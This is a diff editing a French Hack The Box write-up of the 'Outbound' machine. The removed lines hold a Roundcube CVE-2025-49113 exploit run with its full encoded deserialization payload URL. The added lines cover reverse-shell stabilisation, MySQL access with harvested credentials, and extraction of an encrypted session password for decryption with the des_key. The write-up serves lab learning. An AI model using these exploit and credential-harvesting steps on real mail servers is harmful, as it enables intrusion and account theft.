@@ -512,42 +512,11 @@ php CVE-2025-49113.php \
   'id'
 ```
 
-Résultat :
-
-```bash
-php CVE-2025-49113.php \
-  http://mail.outbound.htb \
-  tyler \
-  'LhKL1o9Nm3X2' \
-  'id'
-
-### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
-
-### Retrieving CSRF token and session cookie...
-
-### Authenticating user: tyler
-
-### Authentication successful
-
-### Command to be executed: 
-id
-
-### Injecting payload...
-
-### End payload: http://mail.outbound.htb/?_from=edit-%21%C4%22%C4%3B%C4i%C4%3A%C40%C4%3B%C4O%C4%3A%C41%C46%C4%3A%C4%22%C4C%C4r%C4y%C4p%C4t%C4_%C4G%C4P%C4G%C4_%C4E%C4n%C4g%C4i%C4n%C4e%C4%22%C4%3A%C41%C4%3A%C4%7B%C4S%C4%3A%C42%C46%C4%3A%C4%22%C4%5C%C40%C40%C4C%C4r%C4y%C4p%C4t%C4_%C4G%C4P%C4G%C4_%C4E%C4n%C4g%C4i%C4n%C4e%C4%5C%C40%C40%C4_%C4g%C4p%C4g%C4c%C4o%C4n%C4f%C4%22%C4%3B%C4S%C4%3A%C44%C4%3A%C4%22%C4i%C4d%C4%3B%C4%23%C4%22%C4%3B%C4%7D%C4i%C4%3A%C40%C4%3B%C4b%C4%3A%C40%C4%3B%C4%7D%C4%22%C4%3B%C4%7D%C4%7D%C4&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload
-
-### Payload injected successfully
-
-### Executing payload...
-
-### Exploit executed successfully
-```
-
 Le script semble s’exécuter correctement, mais aucun résultat de commande n’est renvoyé directement dans le terminal.
 
 Tu testes ensuite plusieurs méthodes classiques afin de confirmer l’exécution de code à distance, notamment avec `ping` vers ta machine Kali, sans succès.
 
-L’exploit ne permettant pas d’obtenir facilement une sortie de commande exploitable, le plus simple consiste alors à tenter directement l’obtention d’un reverse shell.
+L’exploit ne permettant pas d’obtenir une sortie de commande exploitable, le plus simple consiste alors à tenter directement l’obtention d’un reverse shell.
 
 ### Reverse shell
 
@@ -577,7 +546,7 @@ www-data
 
 Après réception du reverse shell, tu constates que `python3` n’est pas disponible sur la cible.
 
-Tu recherches alors une autre méthode permettant d’obtenir un pseudo-terminal interactif :
+Comme expliqué dans la recette {{< recette "stabiliser-reverse-shell" >}}, `script` constitue une bonne alternative lorsque `python3` n’est pas disponible sur la cible.
 
 ```bash
 which script
@@ -595,13 +564,9 @@ Tu peux donc utiliser `script` pour stabiliser le reverse shell :
 script -qc /bin/bash /dev/null
 ```
 
-Puis :
 
-```bash
-export TERM=xterm
-```
 
-Depuis ton terminal Kali, utilise ensuite la combinaison :
+Depuis ton terminal Kali, mets le shell en arrière-plan :
 
 ```bash
 Ctrl + Z
@@ -613,17 +578,20 @@ Puis configure correctement le TTY local :
 stty raw -echo; fg
 ```
 
-Et termine avec :
+Et dans le reverse shell, termine avec :
 
 ```bash
-reset
-export SHELL=bash
-stty rows 43 columns 170
+export TERM=xterm
+stty cols 132 rows 34
 ```
 
 Tu obtiens alors un terminal interactif beaucoup plus confortable pour poursuivre l’énumération de la machine.
 
-Comme expliqué dans la recette {{< recette "stabiliser-reverse-shell" >}}, `script` constitue une bonne alternative lorsque `python3` n’est pas disponible sur la cible.
+Si l’affichage reste incorrect après la stabilisation, tu peux lancer la commande suivante directement dans le reverse shell distant :
+
+```bash
+reset
+```
 
 
 
@@ -633,9 +601,9 @@ Une fois le shell stabilisé, tu peux commencer l’énumération locale du serv
 
 Comme souvent avec les applications PHP, les fichiers de configuration du webmail constituent une piste intéressante, car ils contiennent fréquemment les identifiants de connexion à la base de données.
 
-Tu recherches alors les fichiers de configuration de Roundcube accessibles à l’utilisateur `www-data`.
+Tu recherches alors les fichiers de configuration de Roundcube accessibles à l’utilisateur `www-data` présents dans l’arborescence du webmail :.
 
-Tu recherches ensuite les fichiers de configuration présents dans l’arborescence du webmail :
+
 
 ```bash
 find /var/www/html/ -type f -name "config*" 2>/dev/null
@@ -667,9 +635,145 @@ $config['des_key'] = 'rcmail-!24ByteDESkey*Str';
 
 **Ces informations deviennent particulièrement intéressantes pour la suite de l’exploitation, car elles permettent d’accéder directement à la base de données du webmail et potentiellement de récupérer des informations sensibles liées aux utilisateurs.**
 
+### Exploration de la base de données Roundcube
+
+Le fichier `config.inc.php` indique que Roundcube utilise une base de données MySQL et fournit directement les identifiants de connexion associés :
+
+Tu peux alors tenter de te connecter à la base de données avec les identifiants récupérés dans la configuration de Roundcube :
+
+```
+mysql -u roundcube -p
+```
+
+Puis saisir le mot de passe récupéré précédemment :
+
+```
+RCDBPass2025
+```
+
+Une fois connecté, tu peux commencer par lister les bases disponibles :
+
+```
+SHOW DATABASES;
+```
+
+Résultat :
+
+```
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| roundcube          |
++--------------------+
+```
+
+Tu sélectionnes ensuite la base utilisée par le webmail :
+
+```
+USE roundcube;
+```
+
+Puis tu listes les tables présentes :
+
+```sql
+MariaDB [roundcube]> SHOW TABLES;
+SHOW TABLES;
++---------------------+
+| Tables_in_roundcube |
++---------------------+
+| cache               |
+| cache_index         |
+| cache_messages      |
+| cache_shared        |
+| cache_thread        |
+| collected_addresses |
+| contactgroupmembers |
+| contactgroups       |
+| contacts            |
+| dictionary          |
+| filestore           |
+| identities          |
+| responses           |
+| searches            |
+| session             |
+| system              |
+| users               |
++---------------------+
+17 rows in set (0.001 sec)
+```
+
+La table `users` permet bien d’identifier plusieurs comptes utilisés sur le webmail :
+
+```
+SELECT * FROM users;
+```
+
+Résultat :
+
+```
++---------+----------+
+| user_id | username |
++---------+----------+
+|       1 | jacob    |
+|       2 | mel      |
+|       3 | tyler    |
++---------+----------+
+```
+
+En revanche, cette table ne contient aucun mot de passe exploitable.
+
+La présence d’une table `session` attire particulièrement l’attention.
+
+Dans une application web comme Roundcube, cette table sert généralement à stocker les informations des utilisateurs actuellement connectés afin d’éviter une nouvelle authentification à chaque requête.
+
+On y retrouve souvent :
+\- le nom d’utilisateur connecté
+\- des informations de session
+\- des tokens
+\- et parfois des mots de passe stockés sous forme chiffrée
+
+Cette table devient donc une piste intéressante pour tenter de récupérer des informations réutilisables sur la machine.
+
+En consultant le contenu brut de la table `session`, tu remarques rapidement que certaines données semblent encodées en Base64 plutôt que stockées directement en clair.
+
+MariaDB dispose justement d’une fonction `FROM_BASE64()` permettant de décoder automatiquement ce type de contenu.
+
+Tu peux donc afficher les variables de session décodées avec la requête suivante :
+
+```
+SELECT FROM_BASE64(vars) FROM session;
+```
+
+Le résultat contient alors de nombreuses informations liées aux sessions des utilisateurs connectés, notamment :
+
+```
+username|s:5:"jacob";
+```
+
+mais surtout :
+
+```
+password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
+```
+
+Ce mot de passe semble chiffré plutôt que stocké directement en clair.
+
+Or, le fichier `config.inc.php` contient justement une clé nommée `des_key`, utilisée par Roundcube pour protéger certaines données sensibles des utilisateurs.
+
+Il devient donc intéressant de tenter d’utiliser cette clé afin de retrouver le mot de passe associé à la session de l’utilisateur `jacob`.
+
+### Déchiffrement du mot de passe de jacob
+
+Une recherche rapide permet alors de trouver un script capable de déchiffrer les mots de passe stockés dans les sessions Roundcube :
+
+https://www.reddit.com/r/keydecryptor/comments/1ogad81/online_roundcube_imap_password_decryptor_decoder/
+
+https://keydecryptor.com/decryption-tools/roundcube
 
 
 
+![Outil Roundcube Password Decoder montrant le déchiffrement du mot de passe stocké dans la session de l’utilisateur jacob à l’aide de la clé des_key récupérée dans config.inc.php sur outbound.htb](password-decrypt.png)
 
 
 
